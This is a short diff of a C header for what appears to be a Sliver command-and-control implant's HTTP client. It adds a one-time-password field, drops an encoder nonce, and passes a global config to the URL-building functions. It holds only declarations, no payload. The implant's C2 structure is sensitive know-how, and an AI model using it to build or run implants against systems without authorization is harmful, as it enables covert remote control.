@@ -141,6 +141,7 @@ struct _SLIVER_HTTP_CLIENT {
 	LPSTR lpHostName;
 	DWORD dwPort;
 	BOOL UseStandardPort;
+	OTP_DATA OtpData;
 	LPSTR PollPaths[66];
 	DWORD cPollPaths;
 	LPSTR PollFiles[109];
@@ -156,7 +157,6 @@ struct _SLIVER_HTTP_CLIENT {
 	LPSTR lpPathPrefix;
 	DWORD dwMinNumOfSegments;
 	DWORD dwMaxNumOfSegments;
-	UINT64 uEncoderNonce;
 	DWORD dwNetTimeout;
 	DWORD dwTlsTimeout;
 	DWORD dwPollTimeout;
@@ -283,13 +283,9 @@ PHTTP_REQUEST CreateHttpRequest
 	_In_ DWORD cbData
 );
 
-VOID FreeSliverHttpClient
-(
-	_In_ PSLIVER_HTTP_CLIENT pClient
-);
-
 LPSTR StartSessionURL
 (
+	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
 
@@ -301,11 +297,13 @@ LPSTR ParseSegmentsUrl
 
 LPSTR CreatePollURL
 (
+	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
 
 LPSTR CreateSessionURL
 (
+	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
 
